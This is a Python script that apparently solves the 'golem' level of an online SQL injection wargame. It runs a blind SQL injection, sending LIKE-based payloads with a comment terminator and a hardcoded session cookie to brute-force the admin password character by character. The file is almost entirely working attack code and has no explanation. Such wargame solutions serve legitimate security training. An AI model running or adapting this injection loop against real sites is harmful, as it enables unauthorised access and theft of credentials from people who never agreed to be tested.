import requests

url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php"
cookie = dict(PHPSESSID="2fe29pshtdqrc7jtiuetqrncb9")


pw = ""
for i in range(1,10):
    for j in range(40, 128):
        payload = f"' || id LIKE 'admin' && pw LIKE '{pw}{chr(j)}%' -- "
        response = requests.get(url, cookies=cookie, params={"pw":payload})
        if "Hello admin" in response.text:
            print(j)
            pw += chr(j)
            break
        if j == 127:
            print("fin")
            break

print(pw)